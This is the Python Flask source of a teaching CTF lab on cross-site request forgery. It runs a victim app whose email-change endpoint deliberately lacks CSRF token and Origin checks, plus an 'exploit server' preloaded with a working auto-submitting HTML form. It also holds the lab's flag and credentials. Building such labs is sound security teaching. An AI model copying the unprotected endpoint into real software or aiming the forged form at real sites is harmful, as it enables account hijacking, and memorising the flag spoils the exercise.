from flask import (
    Flask,
    request,
    session,
    redirect,
    url_for,
    render_template_string
)

import os
import threading


# =========================================================
# CONFIGURATION
# =========================================================

VICTIM_PORT = int(
    os.environ.get(
        "VICTIM_PORT",
        "7000"
    )
)

EXPLOIT_PORT = int(
    os.environ.get(
        "EXPLOIT_PORT",
        "7001"
    )
)

PUBLIC_VICTIM_ORIGIN = os.environ.get(
    "PUBLIC_VICTIM_ORIGIN",
    ""
).rstrip("/")

PUBLIC_EXPLOIT_ORIGIN = os.environ.get(
    "PUBLIC_EXPLOIT_ORIGIN",
    ""
).rstrip("/")

SECRET_KEY = os.environ.get(
    "SECRET_KEY",
    "gmit-csrf-lab-secret"
)

FLAG = os.environ.get(
    "CTF_FLAG",
    "GMIT{csrf_no_token_mastered}"
)


# =========================================================
# VICTIM ACCOUNT
# =========================================================

VICTIM_USERNAME = os.environ.get(
    "CTF_USERNAME",
    "student"
)

VICTIM_PASSWORD = os.environ.get(
    "CTF_PASSWORD",
    "labpass123"
)


# =========================================================
# EMAIL SETTINGS
# =========================================================

ORIGINAL_EMAIL = os.environ.get(
    "ORIGINAL_EMAIL",
    "student@ctf.local"
)

ATTACKER_EMAIL = os.environ.get(
    "ATTACKER_EMAIL",
    "attacker@evil.local"
)


# =========================================================
# VICTIM APPLICATION
# =========================================================

victim = Flask(
    "csrf_victim"
)

victim.secret_key = SECRET_KEY

victim.config[
    "SESSION_COOKIE_NAME"
] = "gmit_csrf_session"


# Local development remains HTTP-compatible.
# On Fly.io, the cookie becomes Secure because the public victim URL is HTTPS.
victim.config["SESSION_COOKIE_SECURE"] = (
    PUBLIC_VICTIM_ORIGIN.startswith("https://")
)
victim.config["SESSION_COOKIE_HTTPONLY"] = True
victim.config["SESSION_COOKIE_SAMESITE"] = "Lax"


# =========================================================
# EXPLOIT SERVER
# =========================================================

exploit_server = Flask(
    "csrf_exploit_server"
)


# =========================================================
# DEFAULT EXPLOIT
# =========================================================

DEFAULT_EXPLOIT = f"""<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
</head>

<body>

<h1>Loading...</h1>

<form
    id="csrf-form"
    method="POST"
    action="%VICTIM_ORIGIN%/change-email"
>

    <input
        type="hidden"
        name="email"
        value="{ATTACKER_EMAIL}"
    >

</form>

<script>

document
    .getElementById("csrf-form")
    .submit();

</script>

</body>
</html>
"""


STORED_EXPLOIT = DEFAULT_EXPLOIT


# =========================================================
# COMMON CSS
# =========================================================

COMMON_CSS = """
<style>

* {
    box-sizing: border-box;
}


body {

    margin: 0;

    min-height: 100vh;

    font-family:
        Arial,
        Helvetica,
        sans-serif;

    background:
        #f4f5f7;

    color:
        #222;
}


/* =====================================================
   NAVIGATION
===================================================== */

nav {

    background:
        #151922;

    color:
        white;

    padding:
        14px 30px;

    display:
        flex;

    align-items:
        center;

    justify-content:
        space-between;

    gap:
        20px;
}


.brand {

    font-size:
        20px;

    font-weight:
        bold;

    color:
        #ff7a18;

    white-space:
        nowrap;
}


.nav-links {

    display:
        flex;

    gap:
        20px;

    align-items:
        center;

    flex-wrap:
        wrap;
}


.nav-links a {

    color:
        #d9dde5;

    text-decoration:
        none;

    font-size:
        14px;
}


.nav-links a:hover {

    color:
        white;
}


/* =====================================================
   EXPLOIT SERVER NAV BUTTON
===================================================== */

.exploit-nav-button {

    display:
        inline-flex;

    align-items:
        center;

    justify-content:
        center;

    gap:
        7px;

    padding:
        10px 16px;

    background:
        linear-gradient(
            135deg,
            #ff7a18,
            #ff3d00
        );

    color:
        #ffffff !important;

    border:
        1px solid
        #ff9b54;

    border-radius:
        6px;

    font-weight:
        bold;

    letter-spacing:
        0.2px;

    box-shadow:
        0 0 12px
        rgba(
            255,
            88,
            20,
            0.7
        );

    animation:
        exploitPulse
        2s
        infinite;

    transition:
        transform
        0.2s
        ease,
        box-shadow
        0.2s
        ease;
}


.exploit-nav-button:hover {

    background:
        linear-gradient(
            135deg,
            #ff9138,
            #ff4d16
        );

    transform:
        translateY(-1px)
        scale(1.04);

    box-shadow:
        0 0 22px
        rgba(
            255,
            88,
            20,
            0.95
        );
}


@keyframes exploitPulse {

    0% {

        box-shadow:
            0 0 8px
            rgba(
                255,
                100,
                20,
                0.45
            );
    }


    50% {

        box-shadow:
            0 0 22px
            rgba(
                255,
                70,
                10,
                0.95
            );
    }


    100% {

        box-shadow:
            0 0 8px
            rgba(
                255,
                100,
                20,
                0.45
            );
    }

}


/* =====================================================
   LAB HEADER
===================================================== */

.lab-header {

    background:
        linear-gradient(
            135deg,
            #252a36,
            #151922
        );

    color:
        white;

    padding:
        38px 30px;
}


.lab-header-inner {

    max-width:
        1050px;

    margin:
        auto;
}


.lab-label {

    color:
        #ff8a30;

    font-size:
        13px;

    font-weight:
        bold;

    text-transform:
        uppercase;

    letter-spacing:
        1px;
}


.lab-header h1 {

    margin:
        8px 0 14px;

    font-size:
        31px;
}


.difficulty {

    display:
        inline-block;

    background:
        #2e7d32;

    padding:
        5px 11px;

    border-radius:
        4px;

    font-size:
        12px;

    font-weight:
        bold;
}


/* =====================================================
   MAIN
===================================================== */

.wrapper {

    width:
        min(
            1050px,
            92%
        );

    margin:
        30px auto;
}


.card {

    background:
        white;

    border:
        1px solid
        #d9dde5;

    border-radius:
        5px;

    padding:
        28px;

    margin-bottom:
        20px;

    box-shadow:
        0 2px 8px
        rgba(
            0,
            0,
            0,
            0.05
        );
}


.card h2 {

    margin-top:
        0;
}


.description {

    line-height:
        1.7;

    color:
        #545b66;
}


/* =====================================================
   CREDENTIAL HINT
===================================================== */

.credentials-box {

    border-left:
        4px solid
        #ff7a18;

    background:
        #fff7f0;

    padding:
        18px;

    margin-bottom:
        20px;

    border-radius:
        4px;

    line-height:
        1.7;
}


.credentials-title {

    color:
        #d75c00;

    font-weight:
        bold;

    margin-bottom:
        10px;
}


/* =====================================================
   FORM
===================================================== */

label {

    display:
        block;

    margin-top:
        15px;

    margin-bottom:
        7px;

    font-size:
        14px;

    font-weight:
        bold;
}


input,
textarea {

    width:
        100%;

    padding:
        12px;

    border:
        1px solid
        #b9bec8;

    border-radius:
        4px;

    font-size:
        14px;

    outline:
        none;
}


input:focus,
textarea:focus {

    border-color:
        #ff7a18;
}


textarea {

    min-height:
        350px;

    resize:
        vertical;

    font-family:
        Consolas,
        monospace;
}


/* =====================================================
   BUTTONS
===================================================== */

button,
.button {

    display:
        inline-block;

    margin-top:
        16px;

    padding:
        11px 18px;

    background:
        #ff7a18;

    color:
        white;

    border:
        none;

    border-radius:
        4px;

    font-size:
        14px;

    font-weight:
        bold;

    cursor:
        pointer;

    text-decoration:
        none;
}


button:hover,
.button:hover {

    background:
        #e4670c;
}


.secondary {

    background:
        #303745;
}


.secondary:hover {

    background:
        #202631;
}


.danger {

    background:
        #c63524;
}


.danger:hover {

    background:
        #a9291c;
}


/* =====================================================
   ACCOUNT
===================================================== */

.account-line {

    padding:
        13px 0;

    border-bottom:
        1px solid
        #eeeeee;
}


.account-line strong {

    display:
        inline-block;

    width:
        130px;
}


/* =====================================================
   FLAG
===================================================== */

.flag {

    background:
        #e8f8ed;

    border:
        1px solid
        #62b876;

    padding:
        22px;

    border-radius:
        5px;

    margin-bottom:
        20px;

    text-align:
        center;

    color:
        #176c2c;
}


.flag strong {

    display:
        block;

    margin-top:
        10px;

    font-family:
        Consolas,
        monospace;

    color:
        #111111;

    font-size:
        19px;
}


/* =====================================================
   ERROR
===================================================== */

.error {

    background:
        #ffeaea;

    border:
        1px solid
        #da7171;

    color:
        #9b2424;

    padding:
        14px;

    margin-top:
        15px;

    border-radius:
        4px;
}


/* =====================================================
   EXPLOIT SERVER
===================================================== */

.exploit-header {

    background:
        linear-gradient(
            135deg,
            #3a1010,
            #1e0808
        );

    color:
        white;

    padding:
        22px 30px;

    border-bottom:
        3px solid
        #ff4e32;
}


.exploit-header h2 {

    margin:
        0;

    color:
        #ff7070;

    font-size:
        24px;
}


.controls {

    display:
        flex;

    flex-wrap:
        wrap;

    gap:
        10px;
}


code {

    background:
        #eef0f4;

    padding:
        3px 7px;

    border-radius:
        3px;

    font-family:
        Consolas,
        monospace;
}


small {

    color:
        #777777;
}


/* =====================================================
   MOBILE
===================================================== */

@media(max-width: 700px) {

    nav {

        flex-direction:
            column;

        align-items:
            flex-start;

        gap:
            12px;

        padding:
            14px 16px;
    }


    .nav-links {

        gap:
            12px;

        flex-wrap:
            wrap;
    }


    .exploit-nav-button {

        width:
            100%;
    }


    .card {

        padding:
            20px;
    }


    .lab-header {

        padding:
            28px 20px;
    }

}

</style>
"""


# =========================================================
# VICTIM PAGE
# =========================================================

VICTIM_PAGE = """
<!DOCTYPE html>

<html lang="en">

<head>

<meta charset="UTF-8">

<meta
    name="viewport"
    content="width=device-width, initial-scale=1.0"
>

<title>
GMIT CSRF Lab
</title>

""" + COMMON_CSS + """

</head>


<body>


<nav>


<div class="brand">

    GMIT CTF LABS

</div>


<div class="nav-links">


<a href="/">

    Home

</a>


<a href="/my-account">

    My account

</a>


<a
    id="exploit-link"
    class="exploit-nav-button"
    target="_blank"
>

    ⚡ Exploit Server

</a>


</div>


</nav>



<div class="lab-header">


<div class="lab-header-inner">


<div class="lab-label">

    GMIT Web Security Lab

</div>


<h1>

    CSRF vulnerability with no defenses

</h1>


<span class="difficulty">

    APPRENTICE

</span>


</div>


</div>



<div class="wrapper">



{% if solved %}


<div class="flag">


    ✓ Congratulations, you solved the lab!


    <strong>

        {{ flag }}

    </strong>


    <br><br>


    Refresh the page once more to reset the challenge.


</div>


{% endif %}



<div class="card">


<h2>

    Lab description

</h2>


<div class="description">


    This lab contains an email-change function
    that is vulnerable to Cross-Site Request Forgery.


    <br><br>


    The application accepts a sensitive authenticated
    request without requiring a CSRF token.


    <br><br>


    To solve the lab, use the exploit server to force
    the victim user's email address to become:


    <br><br>


    <code>

        {{ attacker_email }}

    </code>


</div>


</div>



{% if not logged_in %}


<!-- =====================================================
     VICTIM CREDENTIAL HINT
===================================================== -->

<div class="credentials-box">


<div class="credentials-title">

    💡 Victim Account Credentials

</div>


Use these credentials to log in to the victim account
before attempting the CSRF challenge.


<br><br>


<strong>

    Username:

</strong>


<code>

    {{ victim_username }}

</code>


<br><br>


<strong>

    Password:

</strong>


<code>

    {{ victim_password }}

</code>


</div>



<!-- =====================================================
     LOGIN
===================================================== -->

<div class="card">


<h2>

    Login

</h2>


<form
    method="POST"
    action="/login"
>


<label>

    Username

</label>


<input
    type="text"
    name="username"
    placeholder="Username"
    autocomplete="off"
    required
>


<label>

    Password

</label>


<input
    type="password"
    name="password"
    placeholder="Password"
    autocomplete="off"
    required
>


<button type="submit">

    Log in

</button>


</form>



{% if error %}


<div class="error">

    {{ error }}

</div>


{% endif %}


</div>


{% else %}



<!-- =====================================================
     ACCOUNT
===================================================== -->

<div class="card">


<h2>

    My account

</h2>



<div class="account-line">


<strong>

    Username

</strong>


{{ username }}


</div>



<div class="account-line">


<strong>

    Email

</strong>


{{ email }}


</div>



<h3>

    Update email

</h3>



<form
    method="POST"
    action="/change-email"
>


<label>

    New email

</label>


<input
    type="email"
    name="email"
    placeholder="name@example.com"
    autocomplete="off"
    required
>


<!--

========================================================

INTENTIONALLY VULNERABLE

There is NO CSRF token.

A secure application should generate and validate
an unpredictable CSRF token associated with the
authenticated user's session.

========================================================

-->


<button type="submit">

    Update email

</button>


</form>



<a
    class="button secondary"
    href="/logout"
>

    Log out

</a>


</div>


{% endif %}


</div>



<script>


const exploitOrigin =

    "{{ public_exploit_origin }}"

    ||

    (
        window.location.protocol
        + "//"
        + window.location.hostname
        + ":{{ exploit_port }}"
    );


const exploitLink =
    document.getElementById(
        "exploit-link"
    );


if (exploitLink) {

    exploitLink.href =
        exploitOrigin;

}


</script>


</body>

</html>
"""


# =========================================================
# EXPLOIT SERVER PAGE
# =========================================================

EXPLOIT_PAGE = """
<!DOCTYPE html>

<html lang="en">

<head>

<meta charset="UTF-8">

<meta
    name="viewport"
    content="width=device-width, initial-scale=1.0"
>

<title>

GMIT Exploit Server

</title>


""" + COMMON_CSS + """

</head>


<body>


<div class="exploit-header">


<h2>

    ⚡ GMIT Exploit Server

</h2>


</div>



<div class="wrapper">


<div class="card">


<h2>

    Craft exploit

</h2>


<p class="description">


    Store HTML on this server and use it to
    generate a cross-origin request to the
    vulnerable application.


</p>



<form
    method="POST"
    action="/store"
>


<label>

    Body

</label>


<textarea
    name="body"
>{{ exploit }}</textarea>



<div class="controls">


<button type="submit">

    💾 Store

</button>


<a
    class="button secondary"
    href="/view"
    target="_blank"
>

    👁 View exploit

</a>


<a
    class="button danger"
    href="/deliver"
>

    ⚡ Deliver exploit to victim

</a>


</div>


</form>



<br>


<small>


Use:


<code>

    %VICTIM_ORIGIN%

</code>


inside the exploit.


<br><br>


It is automatically replaced with the
victim application's address.


</small>


</div>


</div>


</body>

</html>
"""


# =========================================================
# ROOT
# =========================================================

@victim.route("/")
def home():

    return redirect(
        url_for(
            "my_account"
        )
    )


# =========================================================
# MY ACCOUNT
# =========================================================

@victim.route(
    "/my-account"
)
def my_account():


    # =====================================================
    # RESET AFTER FLAG
    # =====================================================

    if session.pop(
        "reset_after_flag",
        False
    ):

        session[
            "email"
        ] = ORIGINAL_EMAIL

        session.pop(
            "csrf_solved",
            None
        )


    # =====================================================
    # SHOW FLAG ONCE
    # =====================================================

    solved = session.pop(
        "csrf_solved",
        False
    )


    if solved:

        session[
            "reset_after_flag"
        ] = True


    return render_template_string(

        VICTIM_PAGE,

        logged_in=
            session.get(
                "logged_in",
                False
            ),

        username=
            VICTIM_USERNAME,

        email=
            session.get(
                "email",
                ORIGINAL_EMAIL
            ),

        solved=
            solved,

        flag=
            FLAG,

        error=
            None,

        exploit_port=
            EXPLOIT_PORT,

        public_exploit_origin=
            PUBLIC_EXPLOIT_ORIGIN,

        victim_username=
            VICTIM_USERNAME,

        victim_password=
            VICTIM_PASSWORD,

        attacker_email=
            ATTACKER_EMAIL

    )


# =========================================================
# LOGIN
# =========================================================

@victim.route(
    "/login",
    methods=["POST"]
)
def login():


    username = request.form.get(
        "username",
        ""
    )


    password = request.form.get(
        "password",
        ""
    )


    if (
        username == VICTIM_USERNAME
        and
        password == VICTIM_PASSWORD
    ):


        session[
            "logged_in"
        ] = True


        session[
            "email"
        ] = ORIGINAL_EMAIL


        return redirect(
            url_for(
                "my_account"
            )
        )


    return render_template_string(

        VICTIM_PAGE,

        logged_in=
            False,

        username=
            VICTIM_USERNAME,

        email=
            ORIGINAL_EMAIL,

        solved=
            False,

        flag=
            FLAG,

        error=
            "Invalid username or password.",

        exploit_port=
            EXPLOIT_PORT,

        public_exploit_origin=
            PUBLIC_EXPLOIT_ORIGIN,

        victim_username=
            VICTIM_USERNAME,

        victim_password=
            VICTIM_PASSWORD,

        attacker_email=
            ATTACKER_EMAIL

    )


# =========================================================
# LOGOUT
# =========================================================

@victim.route(
    "/logout"
)
def logout():


    session.clear()


    return redirect(
        url_for(
            "my_account"
        )
    )


# =========================================================
# VULNERABLE EMAIL CHANGE
# =========================================================

@victim.route(
    "/change-email",
    methods=["POST"]
)
def change_email():


    if not session.get(
        "logged_in"
    ):


        return (
            "Authentication required",
            401
        )


    email = request.form.get(
        "email",
        ""
    )


    if not email:


        return (
            "Email required",
            400
        )


    # =====================================================
    #
    # INTENTIONALLY VULNERABLE CSRF ENDPOINT
    #
    # NO:
    #
    # - CSRF token
    # - Origin enforcement
    # - Referer enforcement
    #
    # =====================================================

    session[
        "email"
    ] = email


    # =====================================================
    # CTF SOLVE DETECTION
    #
    # Origin / Referer are only used by the lab grader
    # to determine whether the attack originated from
    # the exploit server.
    # =====================================================

    origin = request.headers.get(
        "Origin",
        ""
    )


    referer = request.headers.get(
        "Referer",
        ""
    )


    exploit_port_marker = (
        ":"
        + str(
            EXPLOIT_PORT
        )
    )


    came_from_exploit_server = (

        exploit_port_marker in origin

        or

        exploit_port_marker in referer

    )


    if (
        email == ATTACKER_EMAIL
        and
        came_from_exploit_server
    ):


        session[
            "csrf_solved"
        ] = True


    return redirect(
        url_for(
            "my_account"
        )
    )


# =========================================================
# RESET
# =========================================================

@victim.route(
    "/reset"
)
def reset():


    session.clear()


    return redirect(
        url_for(
            "my_account"
        )
    )


# =========================================================
# VICTIM HEALTH
# =========================================================

@victim.route(
    "/health"
)
def victim_health():


    return {

        "status":
            "ok",

        "service":
            "gmit-csrf-victim",

        "victim_port":
            VICTIM_PORT,

        "exploit_port":
            EXPLOIT_PORT

    }, 200


# =========================================================
# EXPLOIT HELPERS
# =========================================================

def get_victim_origin():


    # Fly.io exposes the victim through HTTPS on public port 443,
    # even though Flask listens internally on VICTIM_PORT.
    if PUBLIC_VICTIM_ORIGIN:

        return PUBLIC_VICTIM_ORIGIN


    # Local development fallback.
    hostname = request.host.split(
        ":"
    )[0]


    return (

        "http://"

        + hostname

        + ":"

        + str(
            VICTIM_PORT
        )

    )


def render_stored_exploit():


    victim_origin = (
        get_victim_origin()
    )


    return STORED_EXPLOIT.replace(

        "%VICTIM_ORIGIN%",

        victim_origin

    )


# =========================================================
# EXPLOIT SERVER HOME
# =========================================================

@exploit_server.route("/")
def exploit_home():


    return render_template_string(

        EXPLOIT_PAGE,

        exploit=
            STORED_EXPLOIT

    )


# =========================================================
# STORE EXPLOIT
# =========================================================

@exploit_server.route(
    "/store",
    methods=["POST"]
)
def store_exploit():


    global STORED_EXPLOIT


    STORED_EXPLOIT = request.form.get(
        "body",
        ""
    )


    return redirect(
        url_for(
            "exploit_home"
        )
    )


# =========================================================
# VIEW EXPLOIT
# =========================================================

@exploit_server.route(
    "/view"
)
def view_exploit():


    return render_stored_exploit()


# =========================================================
# DELIVER EXPLOIT
# =========================================================

@exploit_server.route(
    "/deliver"
)
def deliver_exploit():


    return render_stored_exploit()


# =========================================================
# EXPLOIT HEALTH
# =========================================================

@exploit_server.route(
    "/health"
)
def exploit_health():


    return {

        "status":
            "ok",

        "service":
            "gmit-csrf-exploit-server",

        "port":
            EXPLOIT_PORT

    }, 200


# =========================================================
# START VICTIM
# =========================================================

def start_victim():


    victim.run(

        host=
            "0.0.0.0",

        port=
            VICTIM_PORT,

        debug=
            False,

        use_reloader=
            False

    )


# =========================================================
# START APPLICATION
# =========================================================

if __name__ == "__main__":


    print()

    print(
        "=" * 70
    )


    print(
        " GMIT CTF - CSRF LAB"
    )


    print(
        "=" * 70
    )


    print()


    print(
        "[+] Victim application:"
    )


    print(
        f"    http://127.0.0.1:{VICTIM_PORT}/"
    )


    print()


    print(
        "[+] Exploit server:"
    )


    print(
        f"    http://127.0.0.1:{EXPLOIT_PORT}/"
    )


    print()


    print(
        "[+] Victim credentials:"
    )


    print(
        f"    Username: {VICTIM_USERNAME}"
    )


    print(
        f"    Password: {VICTIM_PASSWORD}"
    )


    print()


    print(
        "[+] Required target email:"
    )


    print(
        f"    {ATTACKER_EMAIL}"
    )


    print()


    print(
        "[+] Flag:"
    )


    print(
        f"    {FLAG}"
    )


    print()


    print(
        "[+] Manual reset:"
    )


    print(
        f"    http://127.0.0.1:{VICTIM_PORT}/reset"
    )


    print()


    victim_thread = threading.Thread(

        target=
            start_victim,

        daemon=
            True

    )


    victim_thread.start()


    exploit_server.run(

        host=
            "0.0.0.0",

        port=
            EXPLOIT_PORT,

        debug=
            False,

        use_reloader=
            False

    )